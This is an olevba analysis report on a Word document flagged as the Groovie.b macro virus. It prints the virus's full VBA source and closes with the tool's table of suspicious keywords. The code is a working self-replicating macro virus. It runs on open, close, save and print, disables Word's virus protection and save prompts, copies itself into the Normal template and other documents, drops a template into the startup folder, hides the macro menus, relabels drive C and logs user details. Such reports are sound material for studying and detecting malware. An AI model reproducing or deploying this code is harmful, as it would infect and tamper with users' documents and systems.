olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-4f683e75de263ab80991f8e44297c0cf44a14967
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-4f683e75de263ab80991f8e44297c0cf44a14967 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-4f683e75de263ab80991f8e44297c0cf44a14967 - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' W10/24/99 6:46:57 PM239WildList239
Public I02 As Boolean
 ' W10/24/99 6:46:57 PM239WildList239
Public I03 As Boolean
 ' W10/24/99 6:46:57 PM239WildList239
Public I04 As Boolean
 ' W10/24/99 6:46:57 PM239WildList239
Public I05 As Boolean
 ' W10/24/99 6:46:57 PM239WildList239
Public I06 As String
 ' W10/24/99 6:46:57 PM239WildList239
Public I07 As Boolean
 ' W10/24/99 6:46:57 PM239WildList239
Public I08 As Boolean
 ' W10/24/99 6:46:57 PM239WildList239
Function I09()
 ' W10/24/99 6:46:57 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:57 PM239WildList239
    If MacroContainer = NormalTemplate Then
 ' W10/24/99 6:46:57 PM239WildList239
        I01 = "normal"
 ' W10/24/99 6:46:57 PM239WildList239
        GoTo checkout
 ' W10/24/99 6:46:57 PM239WildList239
    End If
 ' W10/24/99 6:46:58 PM239WildList239
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' W10/24/99 6:46:58 PM239WildList239
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' W10/24/99 6:46:58 PM239WildList239
checkout:
 ' W10/24/99 6:46:58 PM239WildList239
End Function
 ' W10/24/99 6:46:58 PM239WildList239
Function I10()
 ' W10/24/99 6:46:58 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:58 PM239WildList239
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' W10/24/99 6:46:58 PM239WildList239
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' W10/24/99 6:46:58 PM239WildList239
        If ActiveDocument.VBProject.VBComponents(i).Name = "groovie" Then I04 = True
 ' W10/24/99 6:46:58 PM239WildList239
    Next i
 ' W10/24/99 6:46:58 PM239WildList239
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' W10/24/99 6:46:58 PM239WildList239
        If NormalTemplate.VBProject.VBComponents(i).Name = "groovie" Then I03 = True
 ' W10/24/99 6:46:58 PM239WildList239
    Next i
 ' W10/24/99 6:46:58 PM239WildList239
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' W10/24/99 6:46:58 PM239WildList239
End Function
 ' W10/24/99 6:46:58 PM239WildList239
Function I11()
 ' W10/24/99 6:46:58 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:58 PM239WildList239
Call I09
 ' W10/24/99 6:46:58 PM239WildList239
Call I10
 ' W10/24/99 6:46:58 PM239WildList239
    If I01 = "document" Then Call I12
 ' W10/24/99 6:46:58 PM239WildList239
    If I01 = "normal" Then Call I13
 ' W10/24/99 6:46:58 PM239WildList239
    If I01 = "orbit" Then Call I14
 ' W10/24/99 6:46:58 PM239WildList239
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' W10/24/99 6:46:58 PM239WildList239
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' W10/24/99 6:46:58 PM239WildList239
End Function
 ' W10/24/99 6:46:58 PM239WildList239
Function I12()
 ' W10/24/99 6:46:58 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:58 PM239WildList239
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' W10/24/99 6:46:58 PM239WildList239
    If I03 = False And I05 = False Then
 ' W10/24/99 6:46:58 PM239WildList239
        With NormalTemplate.VBProject
 ' W10/24/99 6:46:58 PM239WildList239
        With .VBComponents.Import("c:\groovie.sys")
 ' W10/24/99 6:46:58 PM239WildList239
        End With
 ' W10/24/99 6:46:58 PM239WildList239
        End With
 ' W10/24/99 6:46:58 PM239WildList239
    End If
 ' W10/24/99 6:46:58 PM239WildList239
    If I02 = False Then
 ' W10/24/99 6:46:58 PM239WildList239
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' W10/24/99 6:46:58 PM239WildList239
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' W10/24/99 6:46:58 PM239WildList239
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' W10/24/99 6:46:58 PM239WildList239
        If I08 = False Then Documents.Open FileName:=I06
 ' W10/24/99 6:46:58 PM239WildList239
        Shell ("label c: groovie"), 0
 ' W10/24/99 6:46:58 PM239WildList239
        Windows(1).Close
 ' W10/24/99 6:46:58 PM239WildList239
    End If
 ' W10/24/99 6:46:58 PM239WildList239
End Function
 ' W10/24/99 6:46:58 PM239WildList239
Function I13()
 ' W10/24/99 6:46:58 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:58 PM239WildList239
Application.ScreenUpdating = False
 ' W10/24/99 6:46:58 PM239WildList239
    Call I17
 ' W10/24/99 6:46:58 PM239WildList239
    If I04 = False And I07 = True Then
 ' W10/24/99 6:46:58 PM239WildList239
        With ActiveDocument.VBProject
 ' W10/24/99 6:46:58 PM239WildList239
        With .VBComponents.Import("c:\groovie.sys")
 ' W10/24/99 6:46:58 PM239WildList239
        End With
 ' W10/24/99 6:46:58 PM239WildList239
        End With
 ' W10/24/99 6:46:58 PM239WildList239
        With Dialogs(wdDialogFileSummaryInfo)
 ' W10/24/99 6:46:58 PM239WildList239
            .Comments = "ALT-F11 says it's groovie!"
 ' W10/24/99 6:46:58 PM239WildList239
            .Execute
 ' W10/24/99 6:46:58 PM239WildList239
        End With
 ' W10/24/99 6:46:58 PM239WildList239
    End If
 ' W10/24/99 6:46:58 PM239WildList239
    If I02 = False And I07 = True Then
 ' W10/24/99 6:46:58 PM239WildList239
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' W10/24/99 6:46:58 PM239WildList239
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' W10/24/99 6:46:58 PM239WildList239
        If I08 = False Then Documents.Open FileName:=I06
 ' W10/24/99 6:46:58 PM239WildList239
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' W10/24/99 6:46:58 PM239WildList239
    End If
 ' W10/24/99 6:46:58 PM239WildList239
    If I02 = False And I07 = False Then
 ' W10/24/99 6:46:58 PM239WildList239
        Documents.Add Template:="", NewTemplate:=False
 ' W10/24/99 6:46:58 PM239WildList239
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' W10/24/99 6:46:58 PM239WildList239
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' W10/24/99 6:46:58 PM239WildList239
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' W10/24/99 6:46:58 PM239WildList239
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' W10/24/99 6:46:58 PM239WildList239
    End If
 ' W10/24/99 6:46:58 PM239WildList239
Application.ScreenUpdating = True
 ' W10/24/99 6:46:58 PM239WildList239
End Function
 ' W10/24/99 6:46:58 PM239WildList239
Function I14()
 ' W10/24/99 6:46:58 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:58 PM239WildList239
Application.ScreenUpdating = False
 ' W10/24/99 6:46:58 PM239WildList239
        If I03 = False And I05 = False Then
 ' W10/24/99 6:46:58 PM239WildList239
            With NormalTemplate.VBProject
 ' W10/24/99 6:46:58 PM239WildList239
            With .VBComponents.Import("c:\groovie.sys")
 ' W10/24/99 6:46:58 PM239WildList239
            End With
 ' W10/24/99 6:46:58 PM239WildList239
            End With
 ' W10/24/99 6:46:58 PM239WildList239
            NormalTemplate.Save
 ' W10/24/99 6:46:58 PM239WildList239
        End If
 ' W10/24/99 6:46:58 PM239WildList239
        If I04 = False Then
 ' W10/24/99 6:46:58 PM239WildList239
            With ActiveDocument.VBProject
 ' W10/24/99 6:46:58 PM239WildList239
            With .VBComponents.Import("c:\groovie.sys")
 ' W10/24/99 6:46:58 PM239WildList239
            End With
 ' W10/24/99 6:46:58 PM239WildList239
            End With
 ' W10/24/99 6:46:58 PM239WildList239
            With Dialogs(wdDialogFileSummaryInfo)
 ' W10/24/99 6:46:58 PM239WildList239
                .Comments = "ALT-F11 says it's groovie!"
 ' W10/24/99 6:46:58 PM239WildList239
                .Execute
 ' W10/24/99 6:46:58 PM239WildList239
            End With
 ' W10/24/99 6:46:58 PM239WildList239
        End If
 ' W10/24/99 6:46:58 PM239WildList239
Application.ScreenUpdating = True
 ' W10/24/99 6:46:58 PM239WildList239
End Function
 ' W10/24/99 6:46:58 PM239WildList239
Function I15()
 ' W10/24/99 6:46:58 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:58 PM239WildList239
    Options.VirusProtection = False
 ' W10/24/99 6:46:58 PM239WildList239
    Options.SaveNormalPrompt = False
 ' W10/24/99 6:46:58 PM239WildList239
    Options.ConfirmConversions = False
 ' W10/24/99 6:46:58 PM239WildList239
    I06 = ActiveDocument.FullName
 ' W10/24/99 6:46:58 PM239WildList239
    Call I11
 ' W10/24/99 6:46:58 PM239WildList239
End Function
 ' W10/24/99 6:46:58 PM239WildList239
Sub AutoOpen()
 ' W10/24/99 6:46:58 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:58 PM239WildList239
Call I15
 ' W10/24/99 6:46:58 PM239WildList239
End Sub
 ' W10/24/99 6:46:58 PM239WildList239
Sub AutoClose()
 ' W10/24/99 6:46:58 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:58 PM239WildList239
I08 = True
 ' W10/24/99 6:46:58 PM239WildList239
Call I15
 ' W10/24/99 6:46:58 PM239WildList239
End Sub
 ' W10/24/99 6:46:58 PM239WildList239
Sub AutoExit()
 ' W10/24/99 6:46:58 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:58 PM239WildList239
Call I15
 ' W10/24/99 6:46:58 PM239WildList239
End Sub
 ' W10/24/99 6:46:58 PM239WildList239
Sub FileSaveAs()
 ' W10/24/99 6:46:58 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:58 PM239WildList239
Call I16
 ' W10/24/99 6:46:58 PM239WildList239
Call I15
 ' W10/24/99 6:46:58 PM239WildList239
Dialogs(wdDialogFileSaveAs).Show
 ' W10/24/99 6:46:58 PM239WildList239
End Sub
 ' W10/24/99 6:46:58 PM239WildList239
Sub filesave()
 ' W10/24/99 6:46:58 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:58 PM239WildList239
Call I16
 ' W10/24/99 6:46:58 PM239WildList239
Call I15
 ' W10/24/99 6:46:58 PM239WildList239
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' W10/24/99 6:46:58 PM239WildList239
End Sub
 ' W10/24/99 6:46:58 PM239WildList239
Sub fileclose()
 ' W10/24/99 6:46:58 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:58 PM239WildList239
I08 = True
 ' W10/24/99 6:46:58 PM239WildList239
Call I15
 ' W10/24/99 6:46:58 PM239WildList239
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' W10/24/99 6:46:58 PM239WildList239
ActiveDocument.Close
 ' W10/24/99 6:46:58 PM239WildList239
End Sub
 ' W10/24/99 6:46:58 PM239WildList239
Sub fileprint()
 ' W10/24/99 6:46:58 PM239WildList239
On Error Resume Next
 ' W10/24/99 6:46:58 PM239WildList239
Call I15
 ' W10/24/99 6:46:58 PM239WildList239
Dialogs(wdDialogFilePrint).Show
 ' W10/24/99 6:46:58 PM239WildList239
End Sub
 ' W10/24/99 6:46:58 PM239WildList239
Sub viewvbcode()
 ' W10/24/99 6:46:58 PM239WildList239
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' W10/24/99 6:46:58 PM239WildList239
End Sub
 ' W10/24/99 6:46:58 PM239WildList239
Sub ToolsMacro()
 ' W10/24/99 6:46:58 PM239WildList239
End Sub
 ' W10/24/99 6:46:58 PM239WildList239
Sub FileTemplates()
 ' W10/24/99 6:46:58 PM239WildList239
End Sub
 ' W10/24/99 6:46:58 PM239WildList239
Function I17()
 ' W10/24/99 6:46:58 PM239WildList239
On Error GoTo docek
 ' W10/24/99 6:46:58 PM239WildList239
    If ActiveDocument.Name <> "" Then
 ' W10/24/99 6:46:58 PM239WildList239
        I07 = True
 ' W10/24/99 6:46:58 PM239WildList239
    End If
 ' W10/24/99 6:46:58 PM239WildList239
    GoTo over
 ' W10/24/99 6:46:58 PM239WildList239
docek:
 ' W10/24/99 6:46:58 PM239WildList239
    I07 = False
 ' W10/24/99 6:46:58 PM239WildList239
over:
 ' W10/24/99 6:46:58 PM239WildList239
End Function
 ' W10/24/99 6:46:58 PM239WildList239
Function I16()
 ' W10/24/99 6:46:58 PM239WildList239
Randomize
 ' W10/24/99 6:46:58 PM239WildList239
rn = Int(Rnd * 999)
 ' W10/24/99 6:46:58 PM239WildList239
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' W10/24/99 6:46:58 PM239WildList239
For x = 2 To 358 Step 2
 ' W10/24/99 6:46:58 PM239WildList239
.DeleteLines x
 ' W10/24/99 6:46:58 PM239WildList239
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & rn & Application.ActivePrinter
 ' W10/24/99 6:46:58 PM239WildList239
Next x
 ' W10/24/99 6:46:58 PM239WildList239
End With
 ' W10/24/99 6:46:58 PM239WildList239
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

